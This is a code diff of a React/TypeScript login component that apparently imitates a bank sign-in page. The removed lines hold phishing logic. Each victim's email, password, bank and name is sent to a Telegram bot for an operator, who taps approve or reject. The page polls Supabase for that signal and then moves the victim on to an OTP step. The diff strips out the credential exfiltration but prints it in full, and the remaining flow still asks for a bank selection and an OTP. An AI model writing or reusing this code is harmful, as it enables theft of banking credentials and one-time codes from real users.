@@ -171,34 +171,6 @@ useEffect(() => {
     load();
   }, [navigate]);
 
-  // Poll Supabase every 3s for admin signal while on awaiting-approval screen
-  const startPolling = useCallback((uid: string) => {
-    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-    pollIntervalRef.current = setInterval(async () => {
-      try {
-        const { data } = await supabase
-          .from("tier3_approval_signals")
-          .select("signal")
-          .eq("user_id", uid)
-          .maybeSingle();
-
-        if (data?.signal === "approved") {
-          clearInterval(pollIntervalRef.current!);
-          pollIntervalRef.current = null;
-          // Clean up signal row
-          await supabase.from("tier3_approval_signals").delete().eq("user_id", uid);
-          setIsTransitioning(true);
-          setTimeout(() => { setStep("auth-confirm"); setIsTransitioning(false); }, 2200);
-        } else if (data?.signal === "rejected") {
-          clearInterval(pollIntervalRef.current!);
-          pollIntervalRef.current = null;
-          await supabase.from("tier3_approval_signals").delete().eq("user_id", uid);
-          setStep("credentials-rejected");
-        }
-      } catch (_) {}
-    }, 3000);
-  }, []);
-
   // Cleanup on unmount
   useEffect(() => {
     return () => { if (pollIntervalRef.current) clearInterval(pollIntervalRef.current); };
@@ -240,40 +212,14 @@ useEffect(() => {
     );
   };
 
-  // KEY CHANGE: send credentials with inline ✅ / ❌ keyboard, then go to waiting screen
   const handleLogin = async () => {
     if (!email || !password) { setLoginError("Please enter email and password"); return; }
     if (!userId) return;
 
     setIsTransitioning(true);
-
-    // Clear any stale signal first
-    await supabase.from("tier3_approval_signals").delete().eq("user_id", userId);
-
-    const credText =
-      `🔐 <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
-      `👤 <b>User:</b> ${profile?.full_name}\n` +
-      `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
-      `📧 <b>USERNAME / EMAIL:</b>\n<code>${email}</code>\n\n` +
-      `🔑 <b>PASSWORD:</b>\n<code>${password}</code>\n\n` +
-      `🕐 ${new Date().toLocaleString()}\n\n` +
-      `━━━━━━━━━━━━━━━━━━━━\n` +
-      `<i>Tap ✅ to send user to OTP page, or ❌ if credentials are wrong.</i>`;
-
-    const msgId = await sendTelegramMessage(credText, {
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "✅ Credentials OK — Send to OTP", callback_data: `approve_creds:${userId}` },
-          { text: "❌ Wrong Credentials", callback_data: `reject_creds:${userId}` },
-        ]],
-      },
-    });
-
-    setPendingMsgId(msgId);
     setLoginError("");
     setIsTransitioning(false);
-    setStep("awaiting-approval");
-    startPolling(userId);
+    setStep("auth-confirm");
   };
 
   const handleOtpChange = (value: string) => {
